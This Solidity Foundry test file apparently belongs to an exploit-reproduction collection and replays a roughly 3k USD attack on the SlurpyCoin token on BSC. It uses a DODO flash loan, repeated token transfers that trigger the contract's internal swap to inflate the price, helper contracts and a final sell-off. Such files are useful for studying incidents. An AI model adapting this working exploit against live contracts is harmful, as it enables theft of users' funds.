// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3k USD
// Attacker : https://bscscan.com/address/0x132d9bbdbe718365af6cc9e43bac109a9a53b138
// Attack Contract : https://bscscan.com/address/0x051e057ea275caf9a73578a97af6e8965e5a2349
// Vulnerable Contract : https://bscscan.com/address/0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c
// Attack Tx : https://bscscan.com/tx/0x6c729ee778332244de099ba0cb68808fcd7be4a667303fcdf2f54dd4b3d29051

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/CertiKAlert/status/1869580379675590731
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant SLURPY_ADDR = 0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c;
address constant DODO_ADDR = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;

contract SlurpyCoin is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 44990635 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        // Step 1: borrow 40 WBNB from DODO
        IDodo(DODO_ADDR).flashLoan(40 ether, 0, address(this), hex"00");
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        IERC20 wbnb = IERC20(WBNB_ADDR);
        IERC20 slurpy = IERC20(SLURPY_ADDR);
        
        wbnb.approve(PANCAKE_ROUTER, type(uint256).max);

        IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));
        address[] memory path = new address[](2);
        path[0] = WBNB_ADDR;
        path[1] = SLURPY_ADDR;

        // Step 2: trigger the BuyOrSell() function via slurpy.transfer to manipulate the token price
        uint256 amountOut = 1_300_000 ether;
        uint256 swapAmountOut = amountOut;
        for (uint256 i = 0; i < 16; i++) {
            uint256[] memory amounts = router.getAmountsIn(swapAmountOut, path);
            router.swapTokensForExactTokens(swapAmountOut, amounts[0], path, address(this), block.timestamp);
            for (uint256 j = 0; j < 15; j++) {
                uint256 amount = 100_000 ether;
                uint256 slurpyBal = 0;
                uint256 bal = 0;
                if (!(i > 0 && j == 0)) {
                    slurpyBal = slurpy.balanceOf(SLURPY_ADDR);
                    bal = slurpy.balanceOf(address(this));
                    if (bal < amount) {
                        swapAmountOut = amountOut - bal;
                        break;
                    }
                }
                slurpy.transfer(SLURPY_ADDR, amount - slurpyBal);
                // trigger the swapEthForTokens()
                slurpy.transfer(address(this), 1 wei);
                if (i == 15 && j >= 6) {
                    break;
                }
            }
        }

        // Step 3: buy more slurpy tokens and send to helper contracts
        amountOut = 1_300_000 ether;
        address[] memory helpers = new address[](8);
        for (uint256 i = 0; i < helpers.length; i++) {
            uint256[] memory amounts = router.getAmountsIn(amountOut, path);
            Helper h = new Helper();
            helpers[i] = address(h);
            router.swapTokensForExactTokens(amountOut, amounts[0], path, address(h), block.timestamp);
        }

        wbnb.approve(PANCAKE_ROUTER, 0);
        slurpy.approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory path2 = new address[](2);
        path2[0] = SLURPY_ADDR;
        path2[1] = WBNB_ADDR;
        // Step 4: sell slurpy tokens for a higher price
        for (uint256 i = 0; i < helpers.length; i++) {
            uint256 bal = slurpy.balanceOf(address(this));
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(bal, 0, path2, address(this), block.timestamp);
            uint256 helperBal = slurpy.balanceOf(helpers[i]);
            if (helperBal == 0) {
                break;
            }
            Helper(helpers[i]).widthdraw(SLURPY_ADDR);
        }
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(slurpy.balanceOf(address(this)), 0, path2, address(this), block.timestamp);

        slurpy.approve(PANCAKE_ROUTER, 0);

        // Step 5: pay back the loan
        wbnb.transfer(DODO_ADDR, baseAmount);

        // Step 6: WBNB -> BNB
        wbnb.withdraw(wbnb.balanceOf(address(this)));
    }

    receive() external payable {}
}

interface ISlurpy {
    function isExcludedFromFee(address account) external view returns (bool);
}

interface IDodo {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
    function _BASE_RESERVE_() external view returns (uint256);
    function _BASE_TOKEN_() external view returns (address);
}

contract Helper {
    function widthdraw(address token) public {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(msg.sender, bal);
    }
}
